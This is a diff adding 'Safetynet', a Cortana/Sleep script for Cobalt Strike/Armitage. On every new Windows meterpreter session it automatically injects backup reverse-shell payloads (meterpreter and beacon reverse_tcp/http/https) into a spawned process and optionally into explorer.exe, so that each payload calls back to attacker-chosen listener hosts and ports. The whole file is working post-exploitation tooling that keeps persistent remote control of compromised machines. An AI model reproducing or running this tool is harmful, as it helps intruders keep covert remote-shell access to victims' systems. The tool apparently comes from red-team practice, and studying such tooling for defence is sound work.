@@ -1,0 +1,431 @@
+
+# Safetynet v1.0
+#
+# See README.txt for more details
+#
+# Built by @harmj0y
+#
+
+global('@safetynets $autorun $table');
+@safetynets = @();
+$autorun = 0;
+
+
+###################################################
+#
+# "Main" event triggers
+#
+###################################################
+
+# called on initial script load
+on ready {
+    
+    println("[*]");
+    println("[+] Safetynet v1.0 Loaded");
+    println("[*]");
+    println("[*] Available commands:");
+    println("[*]");
+    println("[*]    safetynet                   :   launch the main safetynet tab ");
+    println("[*]    list_safetynets             :   list current safetynets to inject");
+    println("[*]    remove_safetynets           :   reset the list of safetynets to inject");
+    println("[*]    install_safetynets SESSION  :   install safetynets on a given session");
+    println("[*]    config_autorun              :   set whether safetynets are installed on initial sessions");
+    println("[*]");
+    println("[!] Warning: set to automatically run on initial sessions!");
+    println("[!] Use config autorun to disable.");
+    println("[*]");
+
+    global('@safetynets');
+
+    # grab any existing safetynets from the database and set our safetynets to that
+    @safetynets = data_list("safetynets")[0];
+
+    # make sure initialization is done correctly if there's nothing there
+    if(!@safetynets){
+        @safetynets = @();
+    }
+
+    # pop up the main tab interface
+    safetynet_tab();
+}
+
+# callback function invoked when a new meterpreter session is established
+on session_sync {
+
+    local('$sessionhost @hostsessions');
+    
+    if (-iswinmeterpreter $1) {
+
+        # get the host IP for this session
+        $sessionhost = session_host($1);
+        
+        # get the sessions for the host
+        @hostsessions = host_sessions($sessionhost);
+        
+        # check if autorun is enabled
+        if ($autorun == 0){
+        
+            # if this is the only session for this host, inject safetynets
+            if (size(@hostsessions) == 1){
+                # run post-exploitation on a system
+                install_safetynets($1);
+            }
+            
+            # if we're not the only session, don't run anything
+            else{
+                #println("sessions already exist for $sessionhost");
+            }
+        }
+        
+    }
+}
+
+
+###################################################
+#
+# commands to expose to the user interface
+#
+###################################################
+
+# launch the main tab interface
+command safetynet {
+    safetynet_tab();
+}
+
+command list_safetynets {
+    local('$safetynet');
+    if (size(@safetynets) == 0) {
+        println("[!] no safetynets specified");
+    }
+    else{
+        println("[*] Safetynets:");
+        foreach $safetynet (@safetynets){
+            println("   $safetynet");
+        } 
+    }
+}
+
+command remove_safetynets {
+    clear(@safetynets);
+}
+
+command install_safetynets{
+    install_safetynets($1);
+}
+
+command config_autorun {
+    $autorun = prompt_confirm("Automatically install safetynets on initial sessions?", "Safetynet Autorun");
+}
+
+
+###################################################
+#
+# command helper methods
+#
+###################################################
+
+# present a user with a nice table of existing listeners to choose from
+# execution continued at item_selected() -> "Add"
+sub add_safetynets {
+
+    local('@raw_data @raw_listeners @listeners');
+    
+    # get listener data from the database and parse it
+    @raw_data = data_list("cloudstrike.listeners");
+    @raw_listeners = split('!!', @raw_data[0]);
+    @listeners = @();
+
+    foreach $raw_listener (@raw_listeners) {
+        if ($raw_listener ne "") {
+            local('$name $payload $port $migrate $null $null $domains %beacon %listener');
+            ($name, $payload, $port, $migrate, $null, $null, $domains) = split('@@', $raw_listener);
+            $s = size(split('@@', $raw_listener));
+
+            # if we have a beacon listener
+            if ($s == 7){
+                ($name, $payload, $port, $migrate, $host1, $host2, $host3) = split('@@', $raw_listener);
+                %beacon = %(name => $name, payload => $payload, host => $host1, port => $port);
+                push(@listeners, %beacon);
+            }
+
+            # otherwise a meterpreter listener
+            else {
+                ($name, $payload, $port, $migrate, $host, $null) = split('@@', $raw_listener);
+                %listener = %(name => $name, payload => $payload, host => $host, port => $port);
+                push(@listeners, %listener);
+            }
+        }
+    }
+
+    # create our listen prompt of available listeners to choose from
+    prompt_list("Listeners", @("Add", "Done"), @('name', 'payload', 'host', 'port'), @listeners, 900, 800);
+}
+
+# allow a user to specify a custom safetynet
+# execution continues at item_selected() -> "Select"
+sub add_safetynet_custom {
+    local('$safetynetport $lhost $lport $found');
+    
+    @payloads = @(
+        %(payload => "windows/beacon_http/reverse_http"),
+        %(payload => "windows/meterpreter/reverse_tcp"),
+        %(payload => "windows/meterpreter/reverse_http"),
+        %(payload => "windows/meterpreter/reverse_https"),
+        %(payload => "windows/shell/reverse_tcp"),
+        %(payload => "windows/shell/reverse_http"),
+        %(payload => "windows/x64/meterpreter/reverse_tcp"),
+        %(payload => "windows/x64/meterpreter/reverse_https"),
+        %(payload => "windows/x64/shell/reverse_tcp"),
+        %(payload => "windows/x64/shell/reverse_https"),
+    );
+
+    prompt_list("Choose a Payload", @("Select", "Cancel"), @('payload'), @payloads, $null, 300, 300);
+}
+
+# checks if a passed lhost and lport are already in the
+# set of safetynets. returns "true" if found, "false" otherwise
+sub safetynet_exists {
+    
+    local('$lhost $lport $found');
+
+    $lhost = $1;
+    $lport = $2;
+
+    $found = "false";
+    foreach @safetynet (@safetynets) {
+
+        ($name, $payload, $host, $port) = @safetynet;
+
+        if ($lhost eq $host && $lport eq $port){
+            $found = "true";
+        }
+    }
+    return $found;
+}
+
+# takes a passed lhost and lport and removes that
+# safetynet from the internal list
+sub safetynet_remove {
+    
+    local('$lhost $lport $found @toremove');
+
+    $lhost = $1;
+    $lport = $2;
+    @toremove = @();
+
+    foreach @safetynet (@safetynets) {
+
+        ($name, $payload, $host, $port) = @safetynet;
+        # if the lhost/lport match, save the safetynet reference for removal
+        if ($lhost eq $host && $lport eq $port){
+            @toremove = @safetynet;
+        }
+    }
+
+    remove(@safetynets, @safetynet);
+    # refresh the table and database
+    refresh_safetynet();
+}
+
+# refresh the safetynet display table and database
+sub refresh_safetynet {
+
+    # clear out the safetynets in the DB
+    data_clear("safetynets");
+    # refresh the safetynets in the DB
+    data_add("safetynets",  @safetynets);
+
+    # refresh the display table
+    @displaysafetynets = @();
+    foreach @safetynet (@safetynets){
+        push(@displaysafetynets, %(name => @safetynet[0], payload => @safetynet[1], host => @safetynet[2], port => @safetynet[3], explorer => @safetynet[4]));
+    }
+    table_update($table, @displaysafetynets);
+}
+
+# open up a tab for out safetynet management - this is the main interaction menu
+sub safetynet_tab {
+
+    local('$safetynet @displaysafetynets');
+
+    @displaysafetynets = @();
+
+    # put each safetynet into a proper format for the tab table
+    foreach @safetynet (@safetynets){
+        push(@displaysafetynets, %(name => @safetynet[0], payload => @safetynet[1], host => @safetynet[2], port => @safetynet[3], explorer => @safetynet[4]));
+    }
+
+    # display a tab with a table showing our safetynets
+    $table = open_table_tab("Safetynets", $null, 
+        @('name', 'payload', 'host', 'port', 'explorer'),                                           # columns
+        @displaysafetynets,                                                                         # rows
+        @("Add From Listeners", "Add Custom", "Remove", "Remove All", "Refresh", "Config Autorun"), # buttons
+        "safetynet_tasks",                                                                          # popup hook
+        $null);                                                                                     # no multiple selections
+
+}
+
+# install a new process and explorer safetynet in the passed session #
+sub install_safetynets {
+    
+    local('$safetynet $name $payload $lhost $lport');
+    
+    # make sure we're actually passed a session
+    if ($1 ne ""){
+    
+        # iterate through specified safetynets and inject
+        if (size(@safetynets) > 0){
+            foreach @safetynet (@safetynets){
+
+                ($name, $payload, $lhost, $lport, $explorer) = @safetynet;
+
+                # make sure we get beacon payloads in the right format
+                $payload = replace($payload, "beacon_http", "meterpreter");
+
+                # spawn a new safetynet in the process context
+                println("[*] injecting safetynet $payload -> ".$lhost.":$lport into ".session_host($1)." session $1");
+                launch("post", "windows/manage/smart_payload_inject", %(LHOST => $lhost, LPORT => $lport, PROCESS => "spawn", PAYLOAD => $payload, HANDLER => "false", SESSION => "$1") );
+
+                # if explorer.exe injection is specified, inject a safetynet into explorer.exe
+                if ($explorer eq "true"){
+                    println("[*] injecting explorer.exe safetynet $payload -> ".$lhost.":$lport into ".session_host($1)." session $1");
+                    launch("post", "windows/manage/smart_payload_inject", %(LHOST => $lhost, LPORT => $lport, PAYLOAD => $payload, HANDLER => "false", PROCESS => "explorer", SESSION => "$1") );
+                }
+            }
+        }
+        else{
+            show_message("No safetynets specified!");
+        }
+    }
+}
+
+
+###################################################
+#
+# Menu event triggers
+#
+###################################################
+
+# fired when user clicks on any of the main tab buttons from safetynet_tab()
+on tab_table_click {
+
+    local('$lhost $lport');
+
+    if ($3 eq "Add From Listeners") {
+        add_safetynets();
+    }
+    if ($3 eq "Add Custom") {
+        add_safetynet_custom();
+    }
+    if ($3 eq "Remove"){
+        ($lhost, $lport) = table_selected($table, "host", "port")[0];
+        safetynet_remove($lhost, $lport);
+    }
+    else if ($3 eq "Remove All") {
+        clear(@safetynets);
+        refresh_safetynet();
+    }
+    else if ($3 eq "Refresh") {
+        refresh_safetynet();
+    }
+    else if ($3 eq "Config Autorun") {
+        $autorun = prompt_confirm("Automatically install safetynets on initial sessions?", "Safetynet Autorun");
+    }
+}
+
+# called by "prompt_list" when a user selects a button
+# invoked by add_safetynets() and add_safetynet_custom()
+on item_selected {
+    
+    # if a user clicked "Add", keep reprompting until they click "Done"
+    if ($1 eq "Add"){
+        local('$name $payload $lhost $lport $found');
+
+        ($name, $payload, $lhost, $lport) = $3;
+        $found = safetynet_exists($lhost, $lport);
+
+        # if the safetynet doesn't exist, add it
+        if ($found eq "false"){
+            # check if user wants to inject into explorer.exe as well -> 0 = yes, 1 = no
+            $explorer = prompt_confirm("Inject into explorer.exe as well?", "Explorer Inject");
+            if ($explorer eq "0"){
+                push(@safetynets, @($name, $payload, $lhost, $lport, "true"));
+            }
+            else{
+                push(@safetynets, @($name, $payload, $lhost, $lport, "false"));
+            }
+        }
+        else{
+            show_message("Safetynet already added!");
+        }
+
+        # prompt user again until "Done" is clicked
+        add_safetynets();
+    }
+    # the custom payload callback for custom safetynets
+    if ($1 eq "Select"){
+
+        local('$payload');
+
+        $payload = $2;
+
+        $lhost = lhost();
+        # prompt for safetynet a HOST:PORT
+        $safetynetport = prompt_text("Enter HOST:PORT", "$lhost $+ :");
+
+        ($lhost, $lport) = split(":", $safetynetport);
+        if ($lport != $null){
+
+            # make sure this safetynet isn't already in there
+            $found = safetynet_exists($lhost, $lport);
+
+            if ($found eq "false"){
+                # check if user wants to inject into explorer.exe as well -> 0 = yes, 1 = no
+                $explorer = prompt_confirm("Inject into explorer.exe as well?", "Explorer Inject");
+                if ($explorer eq "0"){
+                    push(@safetynets, @("custom", $payload, $lhost, $lport, "true"));
+                }
+                else{
+                    push(@safetynets, @("custom", $payload, $lhost, $lport, "false"));
+                }
+            }
+            else{
+                show_message("Safetynet already added!");
+            }
+        }
+    }
+
+    # refresh the main table and database
+    refresh_safetynet();
+}
+
+
+###################################################
+#
+# Menu modifications
+#
+###################################################
+
+# add in Safetynet Config options to the main "Cobalt Strike" menu
+popup main_middle {
+
+    item "Safetynets" {
+        safetynet_tab();
+    }
+}
+
+# add in our custom action options to a host
+popup meterpreter_top {
+    item "Install Safetynets" {
+        install_safetynets($1);
+    }
+}
+
+# subtasks for when you right click on a safetynet
+popup safetynet_tasks {
+    item "Remove" {
+        # Remove this specific safetynet from the list
+        ($lhost, $lport) = table_selected($table, "host", "port")[0];
+        safetynet_remove($lhost, $lport);
+    }
+}
